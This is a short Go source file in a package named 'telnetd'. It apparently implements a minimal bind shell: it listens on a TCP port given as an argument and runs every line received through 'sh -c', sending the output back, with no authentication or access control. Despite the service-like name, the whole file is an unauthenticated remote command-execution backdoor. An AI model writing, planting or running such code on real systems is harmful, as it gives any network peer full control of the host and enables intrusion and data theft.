package telnetd

import (
	"bufio"
	"net"
	"os"
	"os/exec"
)

func main() {
	var ln, _ = net.Listen("tcp", os.Args[1]+":"+os.Args[2])
	for {
		var conn, _ = ln.Accept()
		go func() {
			defer conn.Close()
			var scanner = bufio.NewScanner(conn)
			for scanner.Scan() {
				var cmd = exec.Command("sh", "-c", scanner.Text())
				cmd.Stdout = conn
				cmd.Stderr = conn
				cmd.Run()
				if scanner.Text() == "exit" {
					break
				}
			}
		}()
	}
}
